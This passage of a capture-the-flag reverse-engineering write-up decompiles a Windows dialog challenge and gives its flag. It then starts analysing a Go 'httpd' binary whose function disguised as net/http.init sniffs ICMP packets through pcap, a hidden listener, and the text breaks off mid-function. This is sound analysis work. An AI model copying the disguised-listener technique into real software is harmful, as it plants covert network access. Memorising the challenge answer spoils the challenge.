(__fastcall **)(_BYTE *, __int64))(*(_QWORD *)v23 + <span class="number">32LL</span>))(v23, v9);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v20 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v9) = v20 != v19;</span><br><span class="line">    (*(<span class="built_in">void</span> (__fastcall **)(_QWORD *, __int64))(*v20 + <span class="number">32LL</span>))(v20, v9);</span><br><span class="line">  &#125;</span><br><span class="line">  v10 = <span class="keyword">operator</span> <span class="built_in">new</span>(<span class="number">0x48u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v10 )</span><br><span class="line">    v11 = <span class="built_in">sub_1400010C0</span>(v10, <span class="number">111</span>, <span class="number">110</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">  p_dwInitParam[<span class="number">4</span>] = v11;</span><br><span class="line">  v12 = <span class="keyword">operator</span> <span class="built_in">new</span>(<span class="number">0x38u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v12 )</span><br><span class="line">    v13 = <span class="built_in">sub_140002EE0</span>((<span class="type">int</span>)v12, <span class="number">1001</span>, <span class="number">106</span>, <span class="number">107</span>, hInstance);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v13 = <span class="number">0</span>;</span><br><span class="line">  p_dwInitParam[<span class="number">7</span>] = v13;</span><br><span class="line">  v14 = <span class="keyword">operator</span> <span class="built_in">new</span>(<span class="number">0x38u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v14 )</span><br><span class="line">    v15 = <span class="built_in">sub_140002EE0</span>((<span class="type">int</span>)v14, <span class="number">1003</span>, <span class="number">104</span>, <span class="number">105</span>, hInstance);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v15 = <span class="number">0</span>;</span><br><span class="line">  p_dwInitParam[<span class="number">8</span>] = v15;</span><br><span class="line">  v16 = <span class="keyword">operator</span> <span class="built_in">new</span>(<span class="number">0x38u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v16 )</span><br><span class="line">    v17 = <span class="built_in">sub_140002EE0</span>((<span class="type">int</span>)v16, <span class="number">1002</span>, <span class="number">102</span>, <span class="number">103</span>, hInstance);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v17 = <span class="number">0</span>;</span><br><span class="line">  p_dwInitParam[<span class="number">9</span>] = v17;</span><br><span class="line">  p_dwInitParam[<span class="number">5</span>] = <span class="built_in">CreateSolidBrush</span>(<span class="number">0x33312Fu</span>);</span><br><span class="line">  p_dwInitParam[<span class="number">6</span>] = <span class="built_in">CreateFontW</span>(<span class="number">18</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">700</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0</span>, <span class="string">L&quot;Consolas&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( p_dwInitParam[<span class="number">14</span>] &gt; <span class="number">0xFu</span> )</span><br><span class="line">    v6 = (_QWORD *)*v6;</span><br><span class="line">  p_dwInitParam[<span class="number">13</span>] = <span class="number">0</span>;</span><br><span class="line">  *(_BYTE *)v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> p_dwInitParam;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>From Resource Hacker, the 106 &amp; 107 is the play button, 104 &amp; 105 is exit, and 102 &amp; 103 is about. Also, the resource id 130 is the success page, and dialog id 134 is the success dialog.</p>
<p>Dialog function:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">INT_PTR __fastcall <span class="title">DialogFunc</span><span class="params">(HWND hWnd, <span class="type">unsigned</span> <span class="type">int</span> n272, __int64 a3, _QWORD *dwNewLong)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( n272 == <span class="number">272</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    dwNewLong[<span class="number">2</span>] = hWnd;</span><br><span class="line">    <span class="built_in">SetWindowLongPtrW</span>(hWnd, <span class="number">-21</span>, (LONG_PTR)dwNewLong);</span><br><span class="line">    <span class="keyword">return</span> (*(<span class="built_in">int</span> (__fastcall **)(_QWORD *))(*dwNewLong + <span class="number">8LL</span>))(dwNewLong);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">GetWindowLongPtrW</span>(hWnd, <span class="number">-21</span>);</span><br><span class="line">    <span class="keyword">if</span> ( result )</span><br><span class="line">      <span class="keyword">return</span> (*(__int64 (__fastcall **)(INT_PTR, _QWORD, __int64, _QWORD *))(*(_QWORD *)result + <span class="number">32LL</span>))(result,n272,a3,dwNewLong);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The case GetWindowLongPtrW jump to this function:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HGDIOBJ __fastcall <span class="title">sub_7FF68AAC3770</span><span class="params">(__int64 a1, <span class="type">unsigned</span> <span class="type">int</span> n32769, HDC hdc, __int64 a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( n32769 == <span class="number">307</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">SetBkColor</span>(hdc, <span class="number">0x3F5D8Au</span>);</span><br><span class="line">    <span class="built_in">SetTextColor</span>(hdc, <span class="number">0xFFFFFFu</span>);</span><br><span class="line">    <span class="keyword">return</span> *(HGDIOBJ *)(a1 + <span class="number">40</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( n32769 == <span class="number">312</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">SetBkMode</span>(hdc, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">GetStockObject</span>(<span class="number">5</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( n32769 == <span class="number">32769</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      nShowCmd = <span class="built_in">sub_7FF68AAC31F0</span>((__int64)v10, a1 + <span class="number">88</span>);</span><br><span class="line">      <span class="built_in">sub_7FF68AAC3D40</span>((__int64)dwInitParam, *(HINSTANCE *)(a1 + <span class="number">8</span>), <span class="number">134</span>, nShowCmd);</span><br><span class="line">      <span class="built_in">DialogBoxParamW_w</span>((LPARAM)dwInitParam, *(HWND *)(a1 + <span class="number">16</span>));</span><br><span class="line">      <span class="built_in">sub_7FF68AAC3EF0</span>((__int64)dwInitParam);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (HGDIOBJ)<span class="built_in">sub_7FF68AAC2D70</span>(a1, n32769, hdc, a4);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Note that <code>if ( n32769 == 32769 )</code> is just the right dialog (dialog 134). And if this value is 0x8001, the program will copy the string at <code>a1+88</code> and show it. Search of <code>PostMessageW</code> find this function:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall <span class="title">sub_7FF68AAC3A60</span><span class="params">(__int64 a1, <span class="type">size_t</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v2 = *(_QWORD *)(a1 + <span class="number">8</span>);</span><br><span class="line">  v3 = (<span class="type">void</span> **)(v2 + <span class="number">88</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !*(_QWORD *)(v2 + <span class="number">104</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v3 != (<span class="type">void</span> **)a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = a2;</span><br><span class="line">      <span class="keyword">if</span> ( a2[<span class="number">3</span>] &gt; <span class="number">0xF</span> )</span><br><span class="line">        v4 = (<span class="type">void</span> *)*a2;</span><br><span class="line">      <span class="built_in">sub_7FF68AAC3C20</span>(v3, v4, a2[<span class="number">2</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">PostMessageW</span>(*(HWND *)(v2 + <span class="number">16</span>), <span class="number">0x8001u</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>And hardware breakpoint at a1+88 is triggered in:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_7FF68AAC3860</span><span class="params">(__int64 a1, __int16 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1001</span>:</span><br><span class="line">      <span class="built_in">sub_7FF68AAC3C20</span>((<span class="type">void</span> **)(a1 + <span class="number">88</span>), &amp;unk_7FF68AAC665A, <span class="number">0</span>);</span><br><span class="line">      v4 = *(_QWORD *)(a1 + <span class="number">80</span>);</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(v4 + <span class="number">28</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sub_7FF68AAC27A0</span>(v4);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">sub_7FF68AAC1F50</span>(v4, <span class="number">141</span>);</span><br><span class="line">        <span class="built_in">sub_7FF68AAC3A00</span>(*(_QWORD *)(a1 + <span class="number">80</span>), <span class="number">1u</span>);</span><br><span class="line">        <span class="built_in">LOBYTE</span>(v5) = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">sub_7FF68AAC3A20</span>(*(_QWORD *)(a1 + <span class="number">80</span>), v5);</span><br><span class="line">        <span class="built_in">sub_7FF68AAC20F0</span>(*(_QWORD *)(a1 + <span class="number">80</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1002</span>:</span><br><span class="line">      nShowCmd_ = <span class="number">0</span>;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      n15 = <span class="number">15</span>;</span><br><span class="line">      <span class="built_in">LOBYTE</span>(nShowCmd_) = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">sub_7FF68AAC3D40</span>((__int64)dwInitParam, *(HINSTANCE *)(a1 + <span class="number">8</span>), <span class="number">132</span>, (__int64)&amp;nShowCmd_);</span><br><span class="line">      <span class="built_in">DialogBoxParamW_w</span>((LPARAM)dwInitParam, *(HWND *)(a1 + <span class="number">16</span>));</span><br><span class="line">      <span class="built_in">sub_7FF68AAC3EF0</span>((__int64)dwInitParam);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1003</span>:</span><br><span class="line">      <span class="built_in">EndDialog</span>(*(HWND *)(a1 + <span class="number">16</span>), <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>id 141 is just the sound’s id, this function is the logic of the play button. And this function is suspicious:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_7FF68AAC3A00</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int8 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  result = <span class="number">2</span> * (a2 ^ <span class="number">1u</span>) - <span class="number">1</span>;</span><br><span class="line">  *(_DWORD *)(a1 + <span class="number">24</span>) = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>As a2 &#x3D; 1, this will return -1. So this is the first broken: the play direction. And the second broken is at sub_7FF68AAC3A20, change this 1 to 0, and play, the flag will show.</p>
<p><font color=deepskyblue><strong>CMO{y0u_g0t_r1ckr0ll3d}</strong></font></p>
<h2 id="Intermediate"><a href="#Intermediate" class="headerlink" title="Intermediate"></a>Intermediate</h2><h3 id="httpd"><a href="#httpd" class="headerlink" title="httpd"></a>httpd</h3><p>Notice that <code>main.main</code> has nothing useful, and text search find the source file <code>/home/crudd/httpd3/httpd.go</code>. Try to find all functions that belong to this file:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> ida_funcs</span><br><span class="line"></span><br><span class="line">output_file = <span class="string">&quot;E:/CTF/temp/out.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> func_ea <span class="keyword">in</span> idautils.Functions():</span><br><span class="line">        func_name = ida_funcs.get_func_name(func_ea)</span><br><span class="line">        f.write(<span class="string">&quot;0x&#123;:X&#125;\n&quot;</span>.<span class="built_in">format</span>(func_ea))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Exported <span class="subst">&#123;<span class="built_in">sum</span>(<span class="number">1</span> <span class="keyword">for</span> _ <span class="keyword">in</span> idautils.Functions())&#125;</span> functions to <span class="subst">&#123;output_file&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    input_file = <span class="string">&quot;out.txt&quot;</span></span><br><span class="line">    binary = <span class="string">&quot;httpd&quot;</span></span><br><span class="line">    target_path = <span class="string">&quot;/home/crudd/httpd3/httpd.go&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f: lines = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]</span><br><span class="line">    matched_addresses = []</span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> tqdm(lines, desc=<span class="string">&quot;Addrs&quot;</span>, unit=<span class="string">&quot;addr&quot;</span>):</span><br><span class="line">        clean_addr = addr.lower().replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        result = subprocess.run([<span class="string">&#x27;addr2line&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>, binary, clean_addr], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        output = result.stdout + result.stderr</span><br><span class="line">        <span class="keyword">if</span> target_path <span class="keyword">in</span> output: matched_addresses.append(addr)</span><br><span class="line">    <span class="keyword">for</span> addr <span class="keyword">in</span> matched_addresses: <span class="built_in">print</span>(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>The output has 3 functions: <code>main.main</code>, <code>main.handler</code> and an extremely suspicious function <code>net/http.init</code>. In fact, this function is disguised as a library function, but it has a very complex logic, and it is the core logic:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __golang <span class="title">net_http_init_0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  device_<span class="number">1.</span>str = (uint8 *)<span class="string">&quot;re0&quot;</span>;</span><br><span class="line">  device_<span class="number">1.l</span>en = <span class="number">3</span>;</span><br><span class="line">  v14 = <span class="built_in">github_com_google_gopacket_pcap_OpenLive</span>(device_1, <span class="number">1600</span>, <span class="number">1</span>, <span class="number">-10000000</span>);</span><br><span class="line">  tab = v<span class="number">14.</span>_b<span class="number">4.</span>tab;</span><br><span class="line">  data = v<span class="number">14.</span>_b<span class="number">4.</span>data;</span><br><span class="line">  <span class="keyword">if</span> ( v<span class="number">14.</span>_b<span class="number">4.</span>tab )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_37:</span><br><span class="line">    e._type = tab-&gt;_type;</span><br><span class="line">    e.data = data;</span><br><span class="line">    <span class="built_in">runtime_gopanic</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">  handle = v<span class="number">14.</span>handle;</span><br><span class="line">  expr.str = (uint8 *)<span class="string">&quot;icmp&quot;</span>;</span><br><span class="line">  expr.len = <span class="number">4</span>;</span><br><span class="line">  v13 = <span class="built_in">github_com_google_gopacket_pcap__ptr_Handle_SetBPFFilter</span>(v<span class="number">14.</span>handle, expr);</span><br><span class="line">  <span class="keyword">if</span> ( v<span class="number">13.</span>tab )</span><br><span class="line">  &#123;</span><br><span class="line">    e_<span class="number">1.</span>_type = v<span class="number">13.</span>tab-&gt;_type;</span><br><span class="line">    e_<span class="number">1.</span>data = v<span class="number">13.</span>data;</span><br><span class="line">    <span class="built_in">runtime_gopanic</span>(e_1);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_37;</span><br><span class="line">  &#125;</span><br><span class="line">  v15 = <span class="built_in">github_com_google_gopacket_pcap__ptr_Handle_pcapDatalink</span>(handle);</span><br><span class="line">  p_gopacket_PacketSource = (gopacket_PacketSource *)<span class="built_in">runtime_newobject</span>((runtime__type_1 *)&amp;RTYPE_gopacket_PacketSource);</span><br><span class="line">  p_gopacket_PacketSource-&gt;source.tab = go_itab__ptr_github_com_google_gopacket_pcap_Handle_comma_github_com_google_gopacket_PacketDataSource;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)&amp;runtime_writeBarrier.enabled )</span><br><span class="line">    <span class="built_in">runtime_gcWriteBarrierCX</span>();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    p_gopacket_PacketSource-&gt;source.data = handle;</span><br><span class="line">  p_gopacket_PacketSource-&gt;decoder.tab = go_itab_github_com_google_gopacket_layers_LinkType_comma_github_com_google_gopacket_Decoder;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)&amp;runtime_writeBarrier.enabled )</span><br><span class="line">    <span class="built_in">runtime_gcWriteBarrierCX</span>();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    p_gopacket_PacketSource-&gt;decoder.data = &amp;runtime_staticuint64s[v15];</span><br><span class="line">  <span class="keyword">for</span> ( c = (runtime_hchan_0 *)<span class="built_in">github_com_google_gopacket__ptr_PacketSource_Packets</span>((github_com_google_gopacket_PacketSource *)p_gopacket_PacketSource);</span><br><span class="line">        ;</span><br><span class="line">        c = c_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    promisc[<span class="number">0</span>] = <span class="built_in">runtime_chanrecv2</span>(c, &amp;elem[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( !promisc[<span class="number">0</span>] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v4 = elem[<span class="number">1</span>];</span><br><span class="line">    elem[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    device_8 = (*(__int64 (__golang **)(_QWORD))(v4 + <span class="number">32</span>))(*((_QWORD *)&amp;v4 + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">if</span> ( timeout &lt; <span class="number">0x18</span> )</span><br><span class="line">      <span class="built_in">runtime_panicSliceAcap</span>();</span><br><span class="line">    <span class="keyword">if</span> ( timeout &lt; <span class="number">0x26</span> )</span><br><span class="line">      <span class="built_in">runtime_panicSliceAcap</span>();</span><br><span class="line">    <span class="keyword">if</span> ( timeout &lt; <span class="number">0x28</span> )</span><br><span class="line">      <span class="built_in">runtime_panicSliceAcap</span>();</span><br><span class="line">    <span class="keyword">if</span> ( timeout &lt; <span class="number">0x2E</span> )</span><br><span class="line">      <span class="built_in">runtime_panicSliceAcap</span>();</span><br><span class="line">    key_16 = device_8;</span><br><span class="line">    n0x22 = *(_QWORD *)promisc;</span><br><span class="line">    v40 = *(_DWORD *)(device_8 + <span class="number">42</span>);</span><br><span class="line">    v39 = *(_WORD *)(device_8 + <span class="number">36</span>);</span><br><span class="line">    array = <span class="built_in">runtime_makeslice</span>((runtime__type_1 *)&amp;RTYPE_uint8, <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    *array = __ROL2__(v39 ^ <span class="built_in">HIWORD</span>(v40), <span class="number">8</span>);</span><br><span class="line">    v38 = __ROL2__(v40 ^ v39, <span class="number">8</span>);</span><br><span class="line">    device_8a.array = array;</span><br><span class="line">    device_8a.len = <span class="number">2</span>;</span><br><span class="line">    device_8a.cap = <span class="number">2</span>;</span><br><span class="line">    old = <span class="built_in">runtime_growslice</span>((runtime__type_1 *)&amp;RTYPE_uint8, device_8a, <span class="number">6</span>);</span><br><span class="line">    array_1 = old.array;</span><br><span class="line">    cap = old.cap;</span><br><span class="line">    key_1 = key_16;</span><br><span class="line">    *(_DWORD *)((<span class="type">char</span> *)old.array + <span class="number">2</span>) = *(_DWORD *)(key_16 + <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">if</span> ( old.cap &lt; <span class="number">8uLL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      device_8b.array = old.array;</span><br><span class="line">      device_8b.len = <span class="number">6</span>;</span><br><span class="line">      device_8b.cap = old.cap;</span><br><span class="line">      olda = <span class="built_in">runtime_growslice</span>((runtime__type_1 *)&amp;RTYPE_uint8, device_8b, <span class="number">8</span>);</span><br><span class="line">      array_1 = olda.array;</span><br><span class="line">      cap = olda.cap;</span><br><span class="line">      key_1 = key_16;</span><br><span class="line">    &#125;</span><br><span class="line">    array_1[<span class="number">3</span>] = *(_WORD *)(key_1 + <span class="number">36</span>);</span><br><span class="line">    <span class="keyword">if</span> ( cap &lt; <span class="number">0xC</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      device_8c.array = array_1;</span><br><span class="line">      device_8c.len = <span class="number">8</span>;</span><br><span class="line">      device_8c.cap = cap;</span><br><span class="line">      oldb = <span class="built_in">runtime_growslice</span>((runtime__type_1 *)&amp;RTYPE_uint8, device_8c, <span class="number">12</span>);</span><br><span class="line">      array_1 = oldb.array;</span><br><span class="line">      cap = oldb.cap;</span><br><span class="line">      key_1 = key_16;</span><br><span class="line">    &#125;</span><br><span class="line">    *((_DWORD *)array_1 + <span class="number">2</span>) = *(_DWORD *)(key_1 + <span class="number">42</span>);</span><br><span class="line">    <span class="keyword">if</span> ( cap &lt; <span class="number">0xE</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      device_8d.array = 